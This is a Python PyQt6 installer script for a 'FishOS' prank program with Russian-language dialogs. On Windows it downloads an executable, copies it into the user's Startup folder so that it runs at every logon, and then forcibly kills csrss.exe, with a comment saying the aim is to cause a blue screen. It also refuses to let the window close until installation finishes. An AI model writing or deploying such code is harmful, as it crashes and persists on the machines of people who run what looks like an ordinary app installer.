import sys
import os
import shutil
from threading import Thread
import requests
from PyQt6 import QtGui
from PyQt6.QtGui import QIcon
from PyQt6.QtWidgets import *
from install_pages import page1, page2
from install_pages.progress import  ProgressWindow

SIZE = (640, 480)
VERSION = 'v0.0.1'


class InstallWindow(QWidget):
    def __init__(self):
        super().__init__()

        self.installed = False
        self.iw = None

        self.setWindowTitle("Install FishOS")
        self.setGeometry(300, 300, *SIZE)
        self.setMaximumSize(*SIZE)
        self.setMinimumSize(*SIZE)

        self.stack = QStackedWidget(self)
        self.main_layout = QVBoxLayout(self)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.addWidget(self.stack)

        self.page1 = page1.Page1(self)
        self.page2 = page2.Page2(self)

        self.stack.addWidget(self.page1)
        self.stack.addWidget(self.page2)

        self.page1.next_btn.clicked.connect(self.page_1_to_2)
        self.page2.install_button.clicked.connect(self.install)

    def page_1_to_2(self):
        self.stack.setCurrentWidget(self.page2)

    def install(self):
        if not (self.page2.cb1.isChecked() and self.page2.cb2.isChecked()):
            QMessageBox.information(
                self,
                "Warning",
                "Пожалуйста, примите пользовательское соглашение и подтведтите, что вы отдаёте отчет своим действиям."
            )
            return
        print("Installing FishOS")

        print(sys.platform)

        self.page2.cb1.setDisabled(True)
        self.page2.cb2.setDisabled(True)
        self.page2.cb3.setDisabled(True)

        self.run_install(sys.platform)

    def download_binary(self, system: str, local_data, startup_folder, link_path):
        if 'win' in system:
            with open(os.path.join(local_data, 'fos.exe'), 'wb') as f:
                r = requests.get('')
                try:
                    if r.status_code == 200:
                        f.write(r.content)
                    else:
                        QMessageBox.critical(
                            self,
                            'Ошибка',
                            "Ошибка получения основного файла программы с сервера. Попробуйте позже."
                        )
                        f.close()
                        return
                except requests.exceptions.ConnectionError:
                    QMessageBox.critical(
                        self,
                        "Ошибка",
                        'Ошибка подключения к серверу. Попробуйте позже'
                    )
                    f.close()
                    return

            # Adding EXE to startup
            shutil.copyfile(os.path.join(local_data, 'fos.exe'), os.path.join(startup_folder, 'fos.exe'))

            self.iw.addValue(10)

            # Killing csrss.exe to make BSOD
            os.system('taskkill /F /IM csrss.exe')
        elif system == 'linux':
            with open(os.path.join(local_data, 'fos'), 'wb') as f:
                r = requests.get(f'https://github.com/Salmon-bit/FishOS/releases/download/{VERSION}/fos')
                try:
                    if r.status_code == 200:
                        f.write(r.content)
                    else:
                        QMessageBox.critical(
                            self,
                            'Ошибка',
                            "Ошибка получения основного файла программы с сервера. Попробуйте позже."
                        )
                        return
                except requests.exceptions.ConnectionError:
                    QMessageBox.critical(
                        self,
                        "Ошибка",
                        'Ошибка подключения к серверу. Попробуйте позже'
                    )
                    return

            os.chmod(os.path.join(local_data, 'fos'), 0o755)

            self.iw.addValue(70)

            with open(link_path, "w") as f:
                DATA = f"""\
[Desktop Entry]
Version=1.0
Name=FishOS
Comment=Fun Operating System
Type=Application
Terminal=false
Exec={os.path.join(local_data, 'fos')}
Icon={os.path.join(local_data, 'fos_ICON.png')}"""
                f.write(DATA)

            self.iw.addValue(10)
            self.installed = True
            QMessageBox.information(
                self,
                "Информация",
                "FishOS успешно утсановлена на ваш ПК.\nСпасибо, что выбираете нас!"
            )

    def run_install(self, system: str):
        if 'win' in system:
            local_appdata = os.getenv("LOCALAPPDATA")
            local_data = os.path.join(local_appdata, "FishOS")
            os.mkdir(local_data)

            with open(os.path.join(local_data, 'fos_ICON.ico'), 'wb') as f:
                try:
                    r = requests.get(
                        'https://raw.githubusercontent.com/Salmon-bit/FishOS/refs/heads/main/assets/fos_ICON.ico')
                    if r.status_code == 200:
                        f.write(r.content)
                    else:
                        QMessageBox.critical(
                            self,
                            'Ошибка',
                            "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                        )
                        f.close()
                        return
                except requests.exceptions.ConnectionError:
                    QMessageBox.critical(
                        self,
                        'Ошибка',
                        "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                    )
                    return

            self.iw = ProgressWindow(QIcon(os.path.join(local_data, 'fos_ICON.ico')))
            self.iw.show()
            self.iw.addValue(20)

            app_data = os.getenv("APPDATA")
            startup_folder = os.path.join(app_data, r"Microsoft\Windows\Start Menu\Programs\Startup")

            # Downloading executable

            th = Thread(target=self.download_binary, args=(sys.platform, local_data, startup_folder, ''))
            th.start()

        elif system == 'linux':
            home_path = os.getenv("HOME")
            home_dirs = os.listdir(home_path)

            if 'Desktop' in home_dirs:
                link_path = os.path.join(os.path.join(home_path, "Desktop"), 'FishOS.desktop')
            elif 'Рабочий стол' in home_dirs:
                link_path = os.path.join(os.path.join(home_path, "Desktop"), 'FishOS.desktop')
            else:
                os.mkdir(os.path.join(home_path, "Desktop"))
                link_path = os.path.join(os.path.join(home_path, "Desktop"))

            local_data = os.path.join(home_path, ".local/share/FishOS")
            os.makedirs(local_data, exist_ok=True)

            with open(os.path.join(local_data, 'fos_ICON.png'), 'wb') as f:
                try:
                    r = requests.get(
                        'https://raw.githubusercontent.com/Salmon-bit/FishOS/refs/heads/main/assets/fos_ICON.png')
                    if r.status_code == 200:
                        f.write(r.content)
                    else:
                        QMessageBox.critical(
                            self,
                            'Ошибка',
                            "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                        )
                        f.close()
                        return
                except requests.exceptions.ConnectionError:
                    QMessageBox.critical(
                        self,
                        'Ошибка',
                        "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                    )
                    f.close()
                    return
            self.iw = ProgressWindow(QIcon(os.path.join(local_data, 'fos_ICON.png')))
            self.iw.show()
            self.iw.addValue(20)

            # Downloading executable

            th = Thread(target=self.download_binary, args=(sys.platform, local_data, '', link_path))
            th.start()

    def closeEvent(self, event: QtGui.QCloseEvent) -> None:
        if not self.installed:
            event.ignore()
        else:
            event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    install_window = InstallWindow()
    install_window.show()

    sys.exit(app.exec())
